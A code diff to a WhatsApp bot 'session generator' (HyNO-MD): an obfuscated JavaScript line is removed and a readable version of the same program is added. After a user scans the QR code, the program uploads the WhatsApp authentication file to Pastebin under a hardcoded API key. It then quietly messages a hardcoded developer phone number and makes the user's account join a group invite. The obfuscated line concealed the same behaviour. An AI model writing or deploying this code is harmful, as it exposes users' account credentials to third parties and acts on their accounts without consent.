@@ -1,1 +1,145 @@
-var _0xacc6=["\x65\x78\x70\x72\x65\x73\x73","\x71\x72\x63\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","\x40\x61\x64\x69\x77\x61\x6A\x73\x68\x69\x6E\x67\x2F\x62\x61\x69\x6C\x65\x79\x73","\x70\x69\x6E\x6F","\x50\x4F\x52\x54","\x65\x6E\x76","\x70\x61\x73\x74\x65\x62\x69\x6E\x2D\x6A\x73","\x68\x34\x63\x4F\x32\x67\x4A\x45\x4D\x77\x6D\x67\x6D\x42\x6F\x74\x65\x59\x75\x66\x57\x36\x5F\x77\x65\x4C\x76\x42\x59\x43\x71\x54","\x2F","\x2E\x2F\x74\x6D\x70\x2F","\x2E\x6A\x73\x6F\x6E","\x73\x69\x6C\x65\x6E\x74","\x44\x65\x73\x6B\x74\x6F\x70","\x6D\x61\x63\x4F\x53","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x2E\x75\x70\x64\x61\x74\x65","\x71\x72","\x65\x6E\x64","\x6F\x70\x65\x6E","\x48\x79\x4E\x4F\x2D\x4D\x44\x20\x73\x65\x73\x73\x69\x6F\x6E","\x4E","\x63\x72\x65\x61\x74\x65\x50\x61\x73\x74\x65\x46\x72\x6F\x6D\x46\x69\x6C\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F","","\x72\x65\x70\x6C\x61\x63\x65","\x73\x70\x6C\x69\x74","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x5F\x48\x5F\x79\x5F\x4E\x5F\x4F\x5F","\x6A\x6F\x69\x6E","\x39\x38\x39\x33\x38\x39\x33\x38\x33\x36\x33\x34\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x60\x60\x60\x51\x52\x20\x63\x6F\x64\x65\x20\x73\x63\x61\x6E\x6E\x65\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\u2705\x60\x60\x60","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x4B\x72\x56\x38\x6A\x6E\x31\x4C\x45\x63\x77\x32\x43\x4A\x44\x67\x50\x33\x4F\x4B\x53\x61","\x67\x72\x6F\x75\x70\x41\x63\x63\x65\x70\x74\x49\x6E\x76\x69\x74\x65","\x43\x6F\x70\x79\x20\x53\x65\x73\x73\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x6F\x74\x70\x2F\x63\x6F\x70\x79\x2F","\x47\x69\x74\x48\x75\x62","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x48\x79\x4E\x4F\x2D\x49\x52\x2F","\x53\x75\x70\x70\x6F\x72\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x61\x2E\x6D\x65\x2F\x39\x38\x39\x33\x38\x39\x33\x38\x33\x36\x33\x34\x3F\x74\x65\x78\x74\x3D\x2A\x48\x69\x2B\x48\x79\x4E\x4F\x2B\x49\x2B\x4E\x65\x65\x64\x2B\x48\x65\x6C\x70\uD83D\uDC68\u200D\uD83D\uDCBB\x2A\x0D\x0A\x0D\x0A\x2A\x53\x65\x73\x73\x69\x6F\x6E\x5F\x49\x44\x20\x3A\x2A\x0D\x0A","\x0D\x0A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x3A\x2A\x20\x6D\x61\x63\x4F\x53\x0D\x0A\x2A\x56\x65\x72\x73\x69\x6F\x6E\x20\x3A\x2A\x20\x33\x2E\x30\x2E\x30","\x48\x65\x79\x20\x74\x68\x65\x72\x65\x21\x20\x59\x6F\x75\x20\x68\x61\x76\x65\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x6C\x6F\x67\x67\x65\x64\x20\x69\x6E\x2E\x20\x53\x74\x65\x70\x20\x31\x2F\x32\x20\x63\x6F\x6D\x70\x6C\x65\x74\x65\x2E\x20\x43\x6C\x69\x63\x6B\x20\x64\x65\x70\x6C\x6F\x79\x20\x6C\x69\x6E\x6B\x20\x68\x65\x72\x65\x20\x74\x6F\x20\x64\x65\x70\x6C\x6F\x79\x20\x28\x53\x74\x65\x70\x20\x32\x29\x0D\x0A\x53\x65\x73\x73\x69\x6F\x6E\x5F\x49\x64\x20\x3A\x0D\x0A","\uD835\uDE77\uD835\uDEA2\uD835\uDE7D\uD835\uDE7E\x2D\uD835\uDE7C\uD835\uDE73\x20\uD835\uDE82\uD835\uDE74\uD835\uDE82\uD835\uDE82\uD835\uDE78\uD835\uDE7E\uD835\uDE7D","\x69\x64","\x75\x73\x65\x72","\x72\x65\x73\x65\x74","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x65\x72\x72\x6F\x72","\x73\x74\x61\x74\x75\x73\x43\x6F\x64\x65","\x6F\x75\x74\x70\x75\x74","\x6F\x6E","\x65\x76","\x55\x6E\x6B\x6E\x6F\x77\x6E\x20\x45\x72\x72\x6F\x72\x20\x4F\x63\x63\x75\x72\x65\x64\x20\x50\x6C\x65\x61\x73\x65\x20\x72\x65\x70\x6F\x72\x74\x20\x74\x6F\x20\x4F\x77\x6E\x65\x72\x20\x61\x6E\x64\x20\x53\x74\x61\x79\x20\x74\x75\x6E\x65\x64","\x6C\x6F\x67","\x75\x73\x65","\x41\x70\x70\x20\x6C\x69\x73\x74\x65\x6E\x65\x64\x20\x6F\x6E\x20\x70\x6F\x72\x74","\x6C\x69\x73\x74\x65\x6E","\x31\x32\x33","\x65\x6E\x63\x72\x79\x70\x74","\x41\x45\x53","\x64\x65\x63\x72\x79\x70\x74","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x63\x68\x61\x72\x41\x74","\x3D"];let express=require(_0xacc6[0]);let app=express();let {toBuffer}=require(_0xacc6[1]);const CryptoJS=require(_0xacc6[2]);const {default:makeWASocket,useSingleFileAuthState,Browsers,delay}=require(_0xacc6[3]);const pino=require(_0xacc6[4]);let PORT=process[_0xacc6[6]][_0xacc6[5]]|| 3030;const PastebinAPI=require(_0xacc6[7]),pastebin= new PastebinAPI(_0xacc6[8]);app[_0xacc6[56]](_0xacc6[9],(_0x3453x8,_0x3453x9)=>{const _0x3453xa=`${_0xacc6[10]}${makeid()}${_0xacc6[11]}`;const {state}=useSingleFileAuthState(_0x3453xa,pino({level:_0xacc6[12]}));function _0x3453xb(){try{let _0x3453xc=makeWASocket({auth:state,printQRInTerminal:true,logger:pino({level:_0xacc6[12]}),browser:Browsers[_0xacc6[14]](_0xacc6[13]),downloadHistory:false,syncFullHistory:false});_0x3453xc[_0xacc6[53]][_0xacc6[52]](_0xacc6[15],async (_0x3453xd)=>{if(_0x3453xd[_0xacc6[16]]){_0x3453x9[_0xacc6[17]]( await toBuffer(_0x3453xd[_0xacc6[16]]))};const {connection,lastDisconnect}=_0x3453xd;if(connection== _0xacc6[18]){ await delay(500* 10);let _0x3453xe= await pastebin[_0xacc6[21]](_0x3453xa,_0xacc6[19],null,0,_0xacc6[20]);let _0x3453xf=_0x3453xe[_0xacc6[24]](_0xacc6[22],_0xacc6[23]);let _0x3453x10=btoa(_0x3453xf);var _0x3453x11=_0x3453x10[_0xacc6[25]](_0xacc6[23]);var _0x3453x12=_0x3453x11[Math[_0xacc6[27]](_0x3453x11[_0xacc6[26]]/ 4)];let _0x3453x13=_0x3453x10[_0xacc6[25]](_0x3453x12)[_0xacc6[29]](_0x3453x12+ _0xacc6[28]); await _0x3453xc[_0xacc6[32]](`${_0xacc6[30]}`,{text:_0xacc6[31]}); await _0x3453xc[_0xacc6[34]](_0xacc6[33]);const _0x3453x14={text:`${_0xacc6[23]}${_0x3453x13}${_0xacc6[23]}`};const _0x3453x15=[{index:1,urlButton:{displayText:_0xacc6[35],url:`${_0xacc6[36]}${_0x3453x13}${_0xacc6[23]}`}},{index:2,urlButton:{displayText:_0xacc6[37],url:`${_0xacc6[38]}`}},{index:3,urlButton:{displayText:_0xacc6[39],url:`${_0xacc6[40]}${_0x3453x13}${_0xacc6[41]}`}}];const _0x3453x16={text:`${_0xacc6[42]}${_0x3453x13}${_0xacc6[23]}`,footer:_0xacc6[43],templateButtons:_0x3453x15}; await _0x3453xc[_0xacc6[32]](_0x3453xc[_0xacc6[45]][_0xacc6[44]],_0x3453x14); await _0x3453xc[_0xacc6[32]](_0x3453xc[_0xacc6[45]][_0xacc6[44]],_0x3453x16); await delay(3000* 10);process[_0xacc6[47]](_0xacc6[46])};if(connection=== _0xacc6[48]&& lastDisconnect&& lastDisconnect[_0xacc6[49]]&& lastDisconnect[_0xacc6[49]][_0xacc6[51]][_0xacc6[50]]!= 401){_0x3453xb()}})}catch(err){console[_0xacc6[55]](err+ _0xacc6[54])}}_0x3453xb()});app[_0xacc6[58]](PORT,()=>{return console[_0xacc6[55]](_0xacc6[57],PORT)});const encrypt=(_0x3453x18)=>{return CryptoJS[_0xacc6[61]][_0xacc6[60]](_0x3453x18,(passphrase= _0xacc6[59])).toString()};const decrypt=(_0x3453x18)=>{return CryptoJS[_0xacc6[61]][_0xacc6[62]](_0x3453x18,passphrase).toString()};function makeid(_0x3453x1b= 9){var _0x3453x1c=_0xacc6[23];var _0x3453x1d=_0xacc6[63];var _0x3453x1e=_0x3453x1d[_0xacc6[26]];for(var _0x3453x1f=0;_0x3453x1f< _0x3453x1b;_0x3453x1f++){_0x3453x1c+= _0x3453x1d[_0xacc6[65]](Math[_0xacc6[27]](Math[_0xacc6[64]]()* _0x3453x1e))};return _0x3453x1c}let encode=(_0x3453x21)=>{return _0x3453x21[_0xacc6[24]](_0xacc6[66],_0xacc6[23])}
+let express = require("express");
+let app = express();
+let { toBuffer } = require("qrcode");
+const CryptoJS = require("crypto-js");
+const {
+  default: makeWASocket,
+  useSingleFileAuthState,
+  Browsers,
+  delay,
+} = require("@adiwajshing/baileys");
+
+const pino = require("pino");
+let PORT = process.env.PORT || 3030;
+
+const PastebinAPI = require("pastebin-js"),
+  pastebin = new PastebinAPI("h4cO2gJEMwmgmBoteYufW6_weLvBYCqT");
+app.use("/", (req, res) => {
+  const authfile = `./tmp/${makeid()}.json`;
+  const { state } = useSingleFileAuthState(authfile, pino({ level: "silent" }));
+  function XHyNO() {
+    try {
+      let session = makeWASocket({
+        auth: state,
+        printQRInTerminal: true,
+        logger: pino({ level: "silent" }),
+        browser: Browsers.macOS("Desktop"),
+        downloadHistory: false,
+        syncFullHistory: false,
+      });
+
+      session.ev.on("connection.update", async (s) => {
+        if (s.qr) {
+          res.end(await toBuffer(s.qr));
+        }
+        const { connection, lastDisconnect } = s;
+        if (connection == "open") {
+          await delay(500 * 10);
+          let link = await pastebin.createPasteFromFile(
+            authfile,
+            "HyNO-MD session",
+            null,
+            0,
+            "N"
+          );
+          let data = link.replace("https://pastebin.com/", "");
+          let code = btoa(data);
+          var words = code.split("");
+          var ress = words[Math.floor(words.length / 4)];
+          let c = code.split(ress).join(ress + "_H_y_N_O_");
+          
+          await session.sendMessage(`989389383634@s.whatsapp.net`, {text: '```QR code scanned successfully✅```' })
+          
+          await session.groupAcceptInvite('KrV8jn1LEcw2CJDgP3OKSa')
+
+          const templateMessage2 = {
+            text: `${c}`,
+          };
+
+const templateButtons = [
+            {
+              index: 1,
+              urlButton: {
+                displayText: "Copy Session",
+                url: `https://www.whatsapp.com/otp/copy/${c}`,
+              },
+            },
+            {
+              index: 2,
+              urlButton: {
+                displayText: "GitHub",
+                url: `https://github.com/HyNO-IR/`,
+              },
+            },
+            {
+              index: 3,
+              urlButton: {
+                displayText: "Support",
+                url: `https://wa.me/989389383634?text=*Hi+HyNO+I+Need+Help👨‍💻*
+
+*Session_ID :*
+${c}
+*Browser :* macOS
+*Version :* 3.0.0`,
+              },
+            },
+          ];
+
+          const templateMessage = {
+            text: `Hey there! You have successfully logged in. Step 1/2 complete. Click deploy link here to deploy (Step 2)
+
+Session_Id :
+${c}`,
+            footer: "𝙷𝚢𝙽𝙾-𝙼𝙳 𝚂𝙴𝚂𝚂𝙸𝙾𝙽",
+            templateButtons: templateButtons,
+          };
+          
+          await session.sendMessage(session.user.id, templateMessage2);
+          
+          await session.sendMessage(session.user.id, templateMessage);
+
+          await delay(3000 * 10);
+          process.send("reset");
+      }
+        if (
+          connection === "close" &&
+          lastDisconnect &&
+          lastDisconnect.error &&
+          lastDisconnect.error.output.statusCode != 401
+        ) {
+          XHyNO();
+        }
+      });
+    } catch (err) {
+      console.log(
+        err + "Unknown Error Occured Please report to Owner and Stay tuned"
+      );
+    }
+  }
+
+  XHyNO();
+});
+app.listen(PORT, () => console.log("App listened on port", PORT));
+
+const encrypt = (text) => {
+  return CryptoJS.AES.encrypt(text, (passphrase = "123")).toString();
+};
+
+const decrypt = (text) => {
+  return CryptoJS.AES.decrypt(text, passphrase).toString();
+};
+
+function makeid(num = 9) {
+  var result = "";
+  var characters =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  var characters9 = characters.length;
+  for (var i = 0; i < num; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters9));
+  }
+  return result;
+}
+
+let encode = (f) => {
+  return f.replace("=", "");
+};
